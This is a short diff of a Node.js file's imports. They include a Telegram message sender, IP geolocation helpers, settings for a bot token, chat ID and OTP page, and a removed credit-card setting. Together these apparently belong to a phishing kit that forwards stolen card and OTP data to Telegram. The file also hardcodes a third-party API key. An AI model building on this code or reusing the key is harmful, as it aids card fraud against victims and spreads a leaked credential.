@@ -1,7 +1,7 @@
 const { sendMessageFor } = require("simple-telegram-message");
 const ipInfo = require("ip-info-finder");
 const { getClientIp } = require("request-ip");
-const { botToken, chatId, otpPage, cCard } = require("../config/settings");
+const { botToken, chatId, otpPage } = require("../config/settings");
 const axios = require('axios');
 const ApiKey = 'bdc_4422bb94409c46e986818d3e9f3b2bc2';
 const URL = `https://api-bdc.net/data/ip-geolocation?ip=`;
